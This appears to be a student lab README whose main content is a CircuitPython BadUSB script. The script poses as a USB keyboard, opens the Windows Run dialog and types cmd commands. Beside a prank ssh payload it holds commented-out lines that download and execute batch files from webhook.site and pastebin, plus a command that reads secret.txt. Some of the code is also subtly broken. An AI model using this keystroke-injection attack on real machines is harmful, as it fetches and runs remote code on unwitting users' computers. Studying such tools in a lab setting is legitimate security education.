# IoT-Lab
repo for presenting progress of Labolatories 
## Lab-1
### all rooms are marked as done:
![image](https://github.com/Vojtaz27/IoT-Lab/assets/62818302/1a1621d5-8dea-4fc1-ab9f-62a2e41c7f45)

## Lab-4
'''python

      #import webbrowser
      from hashlib import scrypt
      from linecache import lazycache
      import time
      import os
      import usb_hid
      import supervisor
      from adafruit_hid.keycode import Keycode
      from adafruit_hid.keyboard import Keyboard
      from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
      
      ascii = bytes(range(32, 127)).decode()
      
      timerBreakShort = 1.0
      timerBreakLong = 1.0
      
      keyboard = Keyboard(usb_hid.devices)
      layout = KeyboardLayoutUS(keyboard)
      
      def attack():
         keyboard.send(Keycode.WINDOWS, Keycode.R)
         time.sleep(timerBreakShort)
         # Program donwloads code and executes it in cmd.
         #text = "start-process \"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe\" https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        
         #os.system('cmd /c "curl parrot.live"')
         text = "ssh movie.gabe565.com"
         #text = "curl ascii.live/donut"
         #text = "curl parrot.live"
         #text = "curl -s https://webhook.site/f9fe1e9f-557c-4261-a27c-03da55599cf3 -o C:/Users/Student/Desktop/wirus.bat & C:/Users/Student/Desktop/wirus.bat"
         text = text.replace('"', '')
         layout.write(f'cmd /D /K "{text}"\n')
      
        # url = "https://pastebin.com/raw/mPSBVtdF"
        # scrypt = "banana.bat"
        # layout.write(f'cmd \n')
        # time.sleep(1.0)
        # layout.write(f'curl {url} -o {scrypt}\n')
        # time.sleep(1.0)
        # layout.write(f'{scrypt}\n')
        # time.sleep(1.0)
        # lazycache.write('type secret.txt\n')
      
        if __name__ == "__main__":
           attack()
         
'''
